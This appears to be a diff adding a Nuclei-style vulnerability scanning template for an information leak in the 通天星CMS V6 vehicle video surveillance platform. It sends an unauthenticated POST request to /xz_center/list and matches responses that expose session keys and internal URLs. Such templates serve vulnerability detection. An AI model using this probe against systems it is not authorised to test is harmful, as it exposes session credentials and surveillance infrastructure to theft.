@@ -1,0 +1,30 @@
+id: g-sky-cmsv6-xz-center-info-leak
+
+info:
+  name: 通天星CMS V6车载视频监控平台 xz_center 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+
+http:
+  - raw:
+      - |
+        POST /xz_center/list HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"sessionKey\":"
+          - "\"urlBody\":"
+        part: body
+      - type: regex
+        regex:
+          - "\"url\":\"http:\\/\\/\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}(:\\d{1,5})?\\/[a-z]+\\/[a-zA-Z._]+\""
+        part: body
